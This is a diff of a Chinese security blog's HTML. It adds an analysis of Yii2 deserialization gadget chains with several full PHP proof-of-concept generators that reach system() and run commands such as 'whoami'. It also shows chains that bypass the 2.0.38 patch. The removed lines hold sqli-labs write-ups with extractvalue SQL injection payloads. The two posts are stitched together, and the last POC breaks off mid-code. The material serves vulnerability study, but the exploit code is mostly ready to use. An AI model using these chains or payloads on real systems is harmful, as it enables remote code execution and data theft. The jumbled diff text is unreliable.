class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls -al&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>yii\rest\IndexAction::run()</strong></p>
+<p><code>vendor\yiisoft\yii2\rest\IndexAction.php</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checkAccess) &#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;checkAccess, <span class="keyword">$this</span>-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareDataProvider();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$this-&gt;checkAccess</code>以及<code>$this-&gt;id</code>都可控</p>
+<p>利益链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
+
+<p>poc：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意命名空间</p>
+</blockquote>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Yii 2.0.38版本修复该漏洞，那么他是怎么修复的呢？</p>
+<p><img src=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/2020-09-23-143418.png" class="lazyload" data-srcset=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/2020-09-23-143418.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="github compare"></p>
+<p>可以看到就只是在<code>yii\db\BatchQueryResult</code>类里添加了一个<code>__wakeup</code>方法，<code>__wakeup</code>方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当<code>BatchQueryResult</code>类被反序列化时就直接报错，避免反序列化的发生，也就避免了该漏洞产生。</p>
+<h4 id="第二条链RunProcess"><a href="#第二条链RunProcess" class="headerlink" title="第二条链RunProcess"></a>第二条链RunProcess</h4><p>从github commit记录我们已经知道新版本的<code>BatchQueryResult</code>类已经无法反序列化了，那么我们就需要<strong>通过不同的触发点来绕过新版本的Patch</strong></p>
+<p>找其他的类的方式也很简单，全局搜索<code>__destruct</code>与<code>__wakeup</code>函数，然后一个个排查</p>
+<p><code>Codeception\Extension\RunProcess</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;stopProcess();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> $process Process  **/</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning()) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;getCommandLine());</span><br><span class="line">        <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>$this-&gt;processes</code>可控，那也就意味着<code>$process</code>可控，然后下面又调用了<code>$process-&gt;isRunning</code>,这不又可以接上第一条利用链的<code>__call</code>方法开头的后半段吗？</p>
+<p>利用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Codeception\Extension\RunProcess::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
+
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // 生成<span class="title">poc</span></span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 
-</div><h2 id="0x36-less-55"><a href="#0x36-less-55" class="headerlink" title="0x36 less-55"></a>0x36 less-55</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">联合、布尔盲注、延时盲注</td>
-<td align="left"><code>id=($id)</code></td>
-</tr>
-</tbody></table>
-<p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化</p>
-</div><h2 id="0x37-less-56"><a href="#0x37-less-56" class="headerlink" title="0x37 less-56"></a>0x37 less-56</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">联合、布尔盲注、延时盲注</td>
-<td align="left"><code>id=(&#39;$id&#39;)</code></td>
-</tr>
-</tbody></table>
-<p>和 Less-54 相比只是拼接方式不一样</p>
-</div><h2 id="0x38-less-57"><a href="#0x38-less-57" class="headerlink" title="0x38 less-57"></a>0x38 less-57</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">联合、布尔盲注、延时盲注</td>
-<td align="left"><code>id=&quot;$id&quot;</code></td>
-</tr>
-</tbody></table>
-<p>和 Less-54 相比只是拼接方式不一样</p>
-</div><h2 id="0x39-less-58"><a href="#0x39-less-58" class="headerlink" title="0x39 less-58"></a>0x39 less-58</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">报错、布尔盲注、延时盲注</td>
-<td align="left"><code>id=&#39;$id&#39;</code></td>
-</tr>
-</tbody></table>
-<p>变化：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = array_reverse(<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
+<h4 id="第三条链Swift-KeyCache-DiskKeyCache"><a href="#第三条链Swift-KeyCache-DiskKeyCache" class="headerlink" title="第三条链Swift_KeyCache_DiskKeyCache"></a>第三条链Swift_KeyCache_DiskKeyCache</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys <span class="keyword">as</span> <span class="variable">$nsKey</span> =&gt; <span class="variable">$null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearAll(<span class="variable">$nsKey</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这里是通过MySQL查询后的结果作为键，输出预定的数组的内容，故联合查询失效</p>
-<p>但，在查询失败时，返回了错误信息</p>
-<p>Payload：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27;and extractvalue(1,concat(0x7e,(select group_concat(secret_K7ZQ) from qv4m60a0a8),0x7e))--+</span></span><br></pre></td></tr></table></figure>
+<p>跟进clearAll方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearAll</span>(<span class="params"><span class="variable">$nsKey</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="variable">$nsKey</span>, <span class="keyword">$this</span>-&gt;keys)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys[<span class="variable">$nsKey</span>] <span class="keyword">as</span> <span class="variable">$itemKey</span> =&gt; <span class="variable">$null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;clearKey(<span class="variable">$nsKey</span>, <span class="variable">$itemKey</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>疑问</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database())),0x7e))--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(secret_K7ZQ) <span class="keyword">from</span> (select table_name <span class="keyword">from</span> information_schema.tables where table_schema=database() )<span class="keyword">as</span> Scyram),<span class="number">0x7e</span>))--+</span><br><span class="line"></span><br><span class="line"><span class="built_in">ERROR</span> <span class="number">1054</span> (<span class="number">42</span>S22): Unknown column <span class="string">&#x27;secret_K7ZQ&#x27;</span> in <span class="string">&#x27;field list&#x27;</span></span><br><span class="line">    原因：<span class="keyword">from</span>后面是个查询结果，并不能当成表名</span><br><span class="line">    尝试用变量赋值来写？下次试试，这次不太懂MySQL中的变量</span><br></pre></td></tr></table></figure>
+<p>这里的<code>$this-&gt;keys</code>以及<code>$nsKey、$itemKey</code>啥的都是我们可控的，所以是可以执行到<code>$this-&gt;clearKey</code>的，跟进去：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearKey</span>(<span class="params"><span class="variable">$nsKey</span>, <span class="variable">$itemKey</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasKey(<span class="variable">$nsKey</span>, <span class="variable">$itemKey</span>)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;freeHandle(<span class="variable">$nsKey</span>, <span class="variable">$itemKey</span>);</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;path.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$nsKey</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$itemKey</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>$this-&gt;path</code>也可控，这就方便了，可以看到这里是进行了一个字符串拼接操作，那么意味着可以利用魔术方法<code>__toString</code>来触发后续操作</p>
+<p>接着全局搜索<code>__toString</code>方法，有很多</p>
+<p>就拿<code>See.php</code>中的<code>__toString</code>举例,代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) : <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;refers . (<span class="keyword">$this</span>-&gt;description ? <span class="string">&#x27; &#x27;</span> . <span class="keyword">$this</span>-&gt;description-&gt;render() : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>$this-&gt;description</code>可控</p>
+<p>利用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Swift_KeyCache_DiskKeyCache</span><br><span class="line">-&gt;</span><br><span class="line">phpDocumentor\Reflection\DocBlock\Tags\See::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
+
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为render</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span 